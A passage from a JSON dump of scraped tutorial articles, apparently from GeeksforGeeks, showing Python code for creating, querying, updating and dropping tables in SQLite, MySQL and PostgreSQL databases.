connectionconn.close()Output:Deleting TableDROP is used to delete the entire database or a table. It deleted both records in the table along with the table structure.Syntax:\u00a0DROP TABLE TABLE_NAME;Example: Drop SQLite3 table using PythonTotal tables in the gfg.db before droppingNow let\u2019s drop the Student table and then again check the total table in our database.Python3# Import moduleimport sqlite3\u00a0\u00a0# Connecting to sqliteconn = sqlite3.connect('gfg.db')\u00a0\u00a0# Creating a cursor object using# the cursor() methodcursor = conn.cursor()\u00a0\u00a0# Updatingcursor.execute('''DROP TABLE Student;''')\u00a0\u00a0# Commit your changes in the databaseconn.commit()\u00a0\u00a0# Closing the connectionconn.close()Output:Note: To learn more about SQLit3 with Python refer to our Python SQLite3 Tutorial.\u00a0This article is contributed by Rishabh Bansal. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "96265b2b8b8ba89dcefd2303a7245ccd",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Databases offer numerous functionalities by which one can manage large amounts of information easily over the web, and high-volume data input and output over a typical file such as a text file. SQL is a query language and is very popular in databases. Many websites use MySQL. SQLite is a \u201clight\u201d version that works over syntax very much similar to SQL.SQLite is a self-contained, high-reliability, embedded, full-featured, public-domain, SQL database engine. It is the most used database engine in the world wide web.Python has a library to access SQLite databases, called sqlite3, intended for working with this database which has been included with Python package since version 2.5.In this article we will discuss, how to query database using commands like Update and Delete and also to visualize data via graphs.It is recommended to go through SQL using Python | Set 1Updation and Deletion Operation# code for update operationimport sqlite3\u00a0\u00a0# database name to be passed as parameterconn = sqlite3.connect('mydatabase.db')\u00a0\u00a0# update the student recordconn.execute(\"UPDATE Student SET name = 'Sam' where unix='B113059'\")conn.commit()\u00a0\u00a0print \"Total number of rows updated :\", conn.total_changes\u00a0\u00a0cursor = conn.execute(\"SELECT * FROM Student\")for row in cursor:\u00a0\u00a0\u00a0print row,\u00a0\u00a0conn.close()Output:\r\nTotal number of rows updated : 1\r\n(u'B113053', u'Geek', u'2017-01-11 13:53:39', 21.0), \r\n(u'B113058', u'Saan', u'2017-01-11 13:53:39', 21.0), \r\n(u'B113059', u'Sam', u'2017-01-11 13:53:39', 22.0)\r\n# code for delete operationimport sqlite3\u00a0\u00a0# database name to be passed as parameterconn = sqlite3.connect('mydatabase.db')\u00a0\u00a0# delete student record from databaseconn.execute(\"DELETE from Student where unix='B113058'\")conn.commit()print \"Total number of rows deleted :\", conn.total_changes\u00a0\u00a0cursor = conn.execute(\"SELECT * FROM Student\")for row in cursor:\u00a0\u00a0\u00a0print row,\u00a0\u00a0conn.close()Output:\r\nTotal number of rows deleted : 1\r\n(u'B113053', u'Geek', u'2017-01-11 13:53:39', 21.0),\r\n (u'B113059', u'Sam', u'2017-01-11 13:53:39', 22.0)\r\nData input by User# code for executing query using input dataimport sqlite3\u00a0\u00a0# creates a database in RAMcon = sqlite3.connect(\":memory:\")cur = con.cursor()cur.execute(\"create table person (name, age, id)\")\u00a0\u00a0print (\"Enter 5 students names:\")who = [raw_input() for i in range(5)]print (\"Enter their ages respectively:\")age = [int(raw_input()) for i in range(5)]print (\"Enter their ids respectively:\")p_id = [int(raw_input()) for i in range(5)]n = len(who)\u00a0\u00a0for i in range(n):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# This is the q-mark style:\u00a0\u00a0\u00a0\u00a0cur.execute(\"insert into person values (?, ?, ?)\", (who[i], age[i], p_id[i]))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# And this is the named style:\u00a0\u00a0\u00a0\u00a0cur.execute(\"select * from person\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Fetches all entries from table\u00a0\u00a0\u00a0\u00a0print cur.fetchall()Output:\r\n(u'Navin', 34, 113053)\r\n(u'Basu', 42, 113058)\r\n(u'Firoz', 65, 113059)\r\n(u'Tim', 47, 113060)\r\n(u'Varun', 54, 113061)\r\nGraphing with SQLite# graph visualization using matplotlib libraryimport matplotlib.pyplot as plt\u00a0\u00a0def graph_data(p_id,age):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# plotting the points\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0plt.plot(p_id, age, color='yellow', linestyle='dashed', linewidth = 3,\u00a0\u00a0\u00a0\u00a0marker='*', markerfacecolor='blue', markersize=12)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# naming the x axis\u00a0\u00a0\u00a0\u00a0plt.xlabel('Persons Id')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# naming the y axis\u00a0\u00a0\u00a0\u00a0plt.ylabel('Ages')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# plt.plot(p_id,age)\u00a0\u00a0\u00a0\u00a0plt.show()\u00a0\u00a0print (\"Enter 5 students names:\")who = [raw_input() for i in range(5)]print (\"Enter their ages respectively:\")age = [int(raw_input()) for i in range(5)]print (\"Enter their ids respectively:\")p_id = [int(raw_input()) for i in range(5)]\u00a0\u00a0# calling graph functiongraph_data(p_id,age)In this way we can perform such operations using SQL query to communicate with Database and plot a Graph significantly to draw out its characteristic.SQL using Python | Set 1SQL using Python | Set 3 (Handling large data)My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "cdc9385a2e93da2d8ae9539e44095535",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "It is recommended to go through SQL using Python | Set 1 and SQL using Python and SQLite | Set 2In the previous articles the records of the database were limited to small size and single tuple. This article will explain how to write & fetch large data from the database using module SQLite3 covering all exceptions.A simple way is to execute the query and use fetchall(). This has been already discussed in SET 1.executescript()This is a convenience method for executing multiple SQL statements at once. It executes the SQL script it gets as a parameter.Syntax:sqlite3.connect.executescript(script)import sqlite3\u00a0\u00a0# Connection with the DataBase# 'library.db'connection = sqlite3.connect(\"library.db\")cursor = connection.cursor()\u00a0\u00a0# SQL piece of code Executed# SQL piece of code Executedcursor.executescript(\"\"\"\u00a0\u00a0\u00a0\u00a0CREATE TABLE people(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0firstname,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lastname,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0age\u00a0\u00a0\u00a0\u00a0);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CREATE TABLE book(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0title,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0author,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0published\u00a0\u00a0\u00a0\u00a0);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0INSERT INTO\u00a0\u00a0\u00a0\u00a0book(title, author, published)\u00a0\u00a0\u00a0\u00a0VALUES (\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Dan Clarke''s GFG Detective Agency',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'Sean Simpsons',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a01987\u00a0\u00a0\u00a0\u00a0);\u00a0\u00a0\u00a0\u00a0\"\"\")\u00a0\u00a0sql = \"\"\"SELECT COUNT(*) FROM book;\"\"\"\u00a0\u00a0cursor.execute(sql)\u00a0\u00a0# The output in fetched and returned# as a List by fetchall()result = cursor.fetchall()print(result)\u00a0\u00a0sql = \"\"\"SELECT * FROM book;\"\"\"\u00a0\u00a0cursor.execute(sql)\u00a0\u00a0result = cursor.fetchall()print(result)\u00a0\u00a0# Changes saved into databaseconnection.commit()\u00a0\u00a0# Connection closed(broken)\u00a0# with DataBaseconnection.close()Output:\r\n[(1,)]\r\n[(\"Dan Clarke's GFG Detective Agency\", 'Sean Simpsons', 1987)]\r\nNote: This piece of code may not work on online interpreters, due to permission privileges to create/write database.executemany()It is often the case when, large amount of data has to be inserted into database from Data Files(for simpler case take Lists, arrays). It would be simple to iterate the code many a times than write every time, each line into database. But the use of loop would not be suitable in this case, the below example shows why. Syntax and use of executemany() is explained below and how it can be used like a loop.import sqlite3\u00a0\u00a0# Connection with the DataBase# 'library.db'connection = sqlite3.connect(\"library.db\")cursor = connection.cursor()\u00a0\u00a0# SQL piece of code Executedcursor.execute(\"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CREATE TABLE book(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0title,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0author,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0published);\"\"\")\u00a0\u00a0\u00a0List = [('A', 'B', 2008), ('C', 'D', 2008),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0('E', 'F', 2010)]\u00a0\u00a0\u00a0connection. executemany(\"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0INSERT INTO\u00a0\u00a0\u00a0\u00a0\u00a0book(title, author, published)\u00a0\u00a0\u00a0\u00a0\u00a0VALUES (?, ?, ?)\"\"\", List)\u00a0\u00a0sql = \"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SELECT * FROM book;\"\"\"cursor.execute(sql)result = cursor.fetchall()for x in result:\u00a0\u00a0\u00a0\u00a0print(x)\u00a0\u00a0# Changes saved into databaseconnection.commit()\u00a0\u00a0# Connection closed(broken)\u00a0# with DataBaseconnection.close()Output:\r\nTraceback (most recent call last):\r\n  File \"C:/Users/GFG/Desktop/SQLITE3.py\", line 16, in \r\n    List[2][3] =[['A', 'B', 2008], ['C', 'D', 2008], ['E', 'F', 2010]]\r\nNameError: name 'List' is not defined\r\nThe use of executemany(), can make the piece of code functional.import sqlite3\u00a0\u00a0\u00a0# Connection with the DataBase# 'library.db'connection = sqlite3.connect(\"library.db\")cursor = connection.cursor()\u00a0\u00a0\u00a0# SQL piece of code Executedcursor.execute(\"\"\"\u00a0\u00a0\u00a0\u00a0CREATE TABLE book(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0title,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0author,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0published);\"\"\")\u00a0\u00a0\u00a0List = [('A', 'B', 2008), ('C', 'D', 2008),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0('E', 'F', 2010)]\u00a0\u00a0\u00a0connection. executemany(\"\"\"\u00a0\u00a0\u00a0\u00a0INSERT INTO\u00a0\u00a0\u00a0\u00a0\u00a0book(title, author, published)\u00a0\u00a0\u00a0\u00a0\u00a0VALUES (?, ?, ?)\"\"\", List)\u00a0\u00a0\u00a0sql = \"\"\"SELECT * FROM book;\"\"\"cursor.execute(sql)result = cursor.fetchall()for x in result:\u00a0\u00a0\u00a0\u00a0print(x)\u00a0\u00a0\u00a0# Changes saved into databaseconnection.commit()\u00a0\u00a0\u00a0# Connection closed(broken)# with DataBaseconnection.close()Output:\r\n('A', 'B', 2008)\r\n('C', 'D', 2008)\r\n('E', 'F', 2010)\r\nFetch Large Dataimport sqlite3\u00a0\u00a0# Connection created with the# database using sqlite3.connect()connection = sqlite3.connect(\"company.db\")cursor = connection.cursor()\u00a0\u00a0# Create Table command executedsql = \"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0CREATE TABLE employee (\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ID INTEGER PRIMARY KEY,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fname VARCHAR(20),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lname VARCHAR(30),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0gender CHAR(1),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dob DATE);\"\"\"cursor.execute(sql)\u00a0\u00a0# Single Tuple insertedsql = \"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0INSERT INTO employee\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0VALUES (1007, \"Will\", \"Olsen\", \"M\", \"24-SEP-1865\");\"\"\"cursor.execute(sql)\u00a0\u00a0# Multiple Rows insertedList = [(1008, 'Rkb', 'Boss', 'M', \"27-NOV-1864\"),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(1098, 'Sak', 'Rose', 'F', \"27-DEC-1864\"),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(1908, 'Royal', 'Bassen', \"F\", \"17-NOV-1894\")]\u00a0\u00a0connection. executemany(\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"INSERT INTO employee VALUES (?, ?, ?, ?, ?)\", List)\u00a0\u00a0print(\"Method-1\\n\")\u00a0\u00a0# Multiple Rows fetched from# the Databasefor row in connection.execute('SELECT * FROM employee ORDER BY ID'):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (row)\u00a0\u00a0print(\"\\nMethod-2\\n\")\u00a0\u00a0# Method-2 to fetch multiple# rowssql = \"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0SELECT * FROM employee ORDER BY ID;\"\"\"\u00a0\u00a0cursor.execute(sql)result = cursor.fetchall()\u00a0\u00a0for x in result:\u00a0\u00a0\u00a0\u00a0print(x)\u00a0\u00a0connection.commit()connection.close()Output:\r\nMethod-1\r\n\r\n(1007, 'Will', 'Olsen', 'M', '24-SEP-1865')\r\n(1008, 'Rkb', 'Boss', 'M', '27-NOV-1864')\r\n(1098, 'Sak', 'Rose', 'F', '27-DEC-1864')\r\n(1908, 'Royal', 'Bassen', 'F', '17-NOV-1894')\r\n\r\nMethod-2\r\n\r\n(1007, 'Will', 'Olsen', 'M', '24-SEP-1865')\r\n(1008, 'Rkb', 'Boss', 'M', '27-NOV-1864')\r\n(1098, 'Sak', 'Rose', 'F', '27-DEC-1864')\r\n(1908, 'Royal', 'Bassen', 'F', '17-NOV-1894')\r\nNote: This piece of code may not work on online interpreters, due to permission privileges to create/write database.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ab41adb6e87f6cb80ef6f08f4e220017",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, we will see how one can insert the user data using variables.\u00a0Here, we are using the sqlite module to work on a database but before that, we need to import that package.\u00a0\u00a0import sqlite3To see the operation on a database level just download the SQLite browser database.Note: For the demonstration, we have used certain values but you can take input instead of those sample values.Steps to create and Insert variables in databaseCode #1: Create the database\u00a0Python3conn = sqlite3.connect('pythonDB.db')c = conn.cursor()Explanation:\u00a0We have initialised the database pythonDB.py. This instruction will create the database if the database doesn\u2019t exist. If the database having the same name as defined exist than it will move further. In the second statement, we use a method of sqlite3 named cursor(), this help you to initiate the database as active.Cursors are created by the connection cursor() method, they are bound to the connection for the entire lifetime and all the commands are executed in the context of the database session wrapped by the connection.\u00a0\u00a0Code #2: Create table\u00a0Python3def create_table():\u00a0\u00a0\u00a0\u00a0c.execute('CREATE TABLE IF NOT EXISTS RecordONE (Number REAL, Name TEXT)')Explanation:\u00a0We have created a function create_table. This will help you to create table if not exist, as written in the query for SQLite database. As we have initiated the table name by RecordONE. After that we pass as many parameters as we want, we just need to give an attribute name along with its type, here, we use REAL and Text.\u00a0\u00a0Code #3: Inserting into table\u00a0Python3def data_entry():\u00a0\u00a0\u00a0\u00a0number = 1234\u00a0\u00a0\u00a0\u00a0name = \"GeeksforGeeks\"\u00a0\u00a0\u00a0\u00a0c.execute(\"INSERT INTO RecordONE (Number, Name) VALUES(?, ?)\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(number, name))\u00a0\u00a0\u00a0\u00a0\u00a0conn.commit()Explanation:\u00a0Another function called data_entry. We are trying to add the values into the database with the help of user input or by variables. We use the execute() method to execute the query. Then use the commit() method to save the changes you have done above.\u00a0\u00a0Code #4: Method calling and Close the connection.\u00a0Python3create_table()data_entry()\u00a0c.close()conn.close()Explanation:\u00a0We normally use the method call, also remember to close the connection and database for the next use if we want to write error-free code because without closing we can\u2019t open the connection again.Let\u2019s see the complete example now.\u00a0Example:\u00a0Python3import sqlite3\u00a0conn = sqlite3.connect('pythonDB.db')c = conn.cursor()\u00a0def create_table():\u00a0\u00a0\u00a0\u00a0c.execute('CREATE TABLE IF NOT EXISTS RecordONE (Number REAL, Name TEXT)')\u00a0def data_entry():\u00a0\u00a0\u00a0\u00a0number = 1234\u00a0\u00a0\u00a0\u00a0name = \"GeeksforGeeks\"\u00a0\u00a0\u00a0\u00a0c.execute(\"INSERT INTO RecordONE (Number, Name) VALUES(?, ?)\", (number, name))\u00a0\u00a0\u00a0\u00a0conn.commit()\u00a0create_table()data_entry()\u00a0c.close()conn.close()Output:\u00a0\u00a0Inserting one more value using data_entry() method.\u00a0\u00a0Python3def data_entry():\u00a0\u00a0\u00a0\u00a0number = 4321\u00a0\u00a0\u00a0\u00a0name = \"Author\"\u00a0\u00a0\u00a0\u00a0c.execute(\"INSERT INTO RecordONE (Number, Name) VALUES(?, ?)\", (number, name))\u00a0\u00a0\u00a0\u00a0conn.commit()Output:\u00a0\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "8e67ab424e343fc34a7ad1027441e1f1",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this article, I have discussed how to connect to MySQL database remotely using python. For any application, it is very important to store the database on a server for easy data access. It is quite complicated to connect to the database remotely because every service provider doesn\u2019t provide remote access to the MySQL database. Here I am using python\u2019s MySQLdb module for connecting to our database which is at any server that provides remote access.\u00a0What is MYSQLdb?MySQLdb is an interface for connecting to a MySQL database server from Python. It implements the Python Database API v2.0 and is built on top of the MySQL C API.\u00a0Packages to Install\u00a0mysql-connector-python\nmysql-pythonIf using anaconda\u00a0conda install -c anaconda mysql-python\nconda install -c anaconda mysql-connector-pythonelse\u00a0pip install MySQL-python\npip install MySQL-python-connectorImport-Package\u00a0import MYSQLdb\u00a0How to connect to a remote MySQL database using python?Before we start you should know the basics of SQL. Now let us discuss the methods used in this code:\u00a0connect(): This method is used for creating a connection to our database it has four arguments:Server NameDatabase User NameDatabase PasswordDatabase Namecursor(): This method creates a cursor object that is capable of executing SQL queries on the database.execute(): This method is used for executing SQL queries on the database. It takes a sql query( as string) as an argument.fetchone(): This method retrieves the next row of a query result set and returns a single sequence, or None if no more rows are available.close() : This method close the database connection.\u00a0Free remote mysql database providers:\u00a01.www.freemysqlhosting.net\u00a02.www.heliohost.org\u00a0\u00a0Python3'''This code would not be run on geeksforgeeks IDEbecause required moduleare not installed on IDE. Also this code requiresa remote MySQL databaseconnection with validHostname, Dbusername Password and Dbname'''\u00a0\u00a0# Module For Connecting To MySQL databaseimport MySQLdb\u00a0# Function for connecting to MySQL databasedef mysqlconnect():\u00a0\u00a0\u00a0\u00a0#Trying to connect\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0db_connection= MySQLdb.connect\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(\"Hostname\",\"dbusername\",\"password\",\"dbname\")\u00a0\u00a0\u00a0\u00a0# If connection is not successful\u00a0\u00a0\u00a0\u00a0except:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Can't connect to database\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 0\u00a0\u00a0\u00a0\u00a0# If Connection Is Successful\u00a0\u00a0\u00a0\u00a0print(\"Connected\")\u00a0\u00a0\u00a0\u00a0\u00a0# Making Cursor Object For Query Execution\u00a0\u00a0\u00a0\u00a0cursor=db_connection.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0# Executing Query\u00a0\u00a0\u00a0\u00a0cursor.execute(\"SELECT CURDATE();\")\u00a0\u00a0\u00a0\u00a0\u00a0# Above Query Gives Us The Current Date\u00a0\u00a0\u00a0\u00a0# Fetching Data\u00a0\u00a0\u00a0\u00a0m = cursor.fetchone()\u00a0\u00a0\u00a0\u00a0\u00a0# Printing Result Of Above\u00a0\u00a0\u00a0\u00a0print(\"Today's Date Is \",m[0])\u00a0\u00a0\u00a0\u00a0\u00a0# Closing Database Connection\u00a0\u00a0\u00a0\u00a0db_connection.close()\u00a0# Function Call For Connecting To Our Databasemysqlconnect()Connected\nToday's Date Is  2017-11-14Python3# Python code to illustrate and create a# table in databaseimport mysql.connector as mysql\u00a0# Open database connectiondb = mysql.connect(host=\"localhost\",user=\"root\",password=\"tiger\",database=\"python\")\u00a0cursor = db.cursor()\u00a0# Drop table if it already exist using execute()cursor.execute(\"DROP TABLE IF EXISTS EMPLOYEE\")\u00a0# Create table as per requirementsql = \"CREATE TABLE EMPLOYEE ( FNAME CHAR(20) NOT NULL, LNAME CHAR(20), AGE INT )\"\u00a0cursor.execute(sql) #table created\u00a0# disconnect from serverdb.close()Output:My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "7b55190caf8769adcf9b0c459ff1727d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "PostgreSQL is an open source object-relational database management system. It is well known for its reliability, robustness, and performance. PostgreSQL has a variety of libraries of API (Application programmable interface) that are available for a variety of popular programming languages such as Python. It provides a lot of features for Database management such as Views, Triggers, Indexes (using B-Trees), etc.There are several python modules that allow us to connect to and manipulate the database using PostgreSQL:Psycopg2pg8000py-postgresqlPyGreSQLPsycopg2 is one of the most popular python drivers for PostgreSQL. It is actively maintained and provides support for different versions of python. It also provides support for Threads and can be used in multithreaded applications. For these reasons, it is a popular choice for developers.In this article, we shall explore the features of PostgreSQl using psycopg2 by building a simple database management system in python.Installation:sudo pip3 install psycopg2 Note: if you are using Python2, use pip install instead of pip3Once psycopg has been installed in your system, we can connect to the database and execute queries in Python.Creating the databasebefore we can access the database in python, we need to create the database in postgresql. To create the database, follow the steps given below:Log in to PostgreSQL:sudo -u postgres psqlConfigure the password:\\passwordYou will then be prompted to enter the password. remember this as we will use it to connect to the database in Python.Create a database called \u201ctest\u201d. we will connect to this database.CREATE DATABASE test; Once the database and password have been configured, exit the psql server.Connecting to the databaseThe connect() method is used to establish connection with the database. It takes 5 parameters:database: The name of the database you are connecting touser: the username of your local systempassword: the password to log in to psqlhost: The host, which is set to localhost by defaultport: The port number which is 5432 by defaultconn = psycopg2.connect(\r\n            database=\"test\", \r\n            user = \"adith\", \r\n            password = \"password\", \r\n            host = \"localhost\", \r\n            port = \"5432\")Once the connection has been established, we can manipulate the database in python.The Cursor object is used to execute sql queries. we can create a cursor object using the connecting object (conn) cur = conn.cursor()  Using this object, we can make changes to the database that we are connected to.After you have executed all the queries, we need to disconnect from the connection. Not disconnecting will not cause any errors but it is generally considered a good practice to disconnect. conn.close() Executing queriesThe execute() method takes in one parameter, the SQL query to be executed. The SQL query is taken in the form of a string that contains the SQL statement. cur.execute(\"SELECT * FROM emp\") Fetching the dataOnce the query has been executed, the results of the query can be obtained using the fetchall() method. This method takes no parameters and returns the result of select queries. res = cur.fetchall() The result of the query is stored in the res variable.Putting it all togetherOnce we have created the database in PostgreSQL, we can access that database in python. We first create an emp table in the database called test with the schema: (id INTEGER PRIMARY KEY, name VARCHAR(10), salary INT, dept INT). Once the table is created without any errors, we insert values into the table.Once the values are inserted, we can query the table to select all the rows and display them to the user using the fetchall() function.# importing librariesimport psycopg2\u00a0\u00a0# a function to connect to# the database.def connect():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# connecting to the database called test\u00a0\u00a0\u00a0\u00a0# using the connect function\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0conn = psycopg2.connect(database =\"test\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0user = \"adith\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0password = \"password\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0host = \"localhost\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0port = \"5432\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# creating the cursor object\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur = conn.cursor()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0except (Exception, psycopg2.DatabaseError) as error:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"Error while creating PostgreSQL table\", error)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# returing the conn and cur\u00a0\u00a0\u00a0\u00a0# objects to be used later\u00a0\u00a0\u00a0\u00a0return conn, cur\u00a0\u00a0\u00a0\u00a0# a function to create the\u00a0# emp table.def create_table():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# connect to the database.\u00a0\u00a0\u00a0\u00a0conn, cur = connect()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the test database contains a table called emp\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the schema : (id INTEGER PRIMARY KEY,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# name VARCHAR(10), salary INT, dept INT)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# create the emp table\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cur.execute('CREATE TABLE emp (id INT PRIMARY KEY, name 